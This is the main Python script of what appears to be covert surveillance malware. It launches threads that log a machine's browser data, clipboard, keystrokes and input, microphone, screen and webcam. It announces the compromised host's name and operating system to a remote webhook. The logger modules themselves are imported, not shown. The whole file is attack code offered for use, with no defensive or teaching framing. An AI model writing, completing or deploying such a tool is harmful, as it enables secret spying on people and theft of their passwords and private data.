import threading
import os
import time
import platform

from loggers.browser_logger import BrowserLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.input_logger import InputLogger
from loggers.microphone_logger import MicrophoneLogger
from loggers.screen_logger import ScreenLogger
from loggers.webcam_logger import WebcamLogger

from utils.file_utils import create_log_directories
from utils.logging_utils import log_error, log_info
from utils.webhook_utils import send_message


def main():
    system_info = platform.uname()
    send_message(
        f"Started logging from `{system_info.node}` running `{system_info.system} {system_info.release}`."
    )

    try:
        create_log_directories()
        loggers = [
            BrowserLogger(),
            ClipboardLogger(),
            InputLogger(),
            MicrophoneLogger(),
            ScreenLogger(),
            WebcamLogger(),
        ]

        threads = []
        for logger in loggers:
            thread = threading.Thread(target=logger.run)
            thread.start()
            threads.append(thread)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            for logger in loggers:
                logger.running = False

            for thread in threads:
                thread.join()

        return 0
    except Exception as e:
        log_error(e)
        return 1


if __name__ == "__main__":
    exit(main())
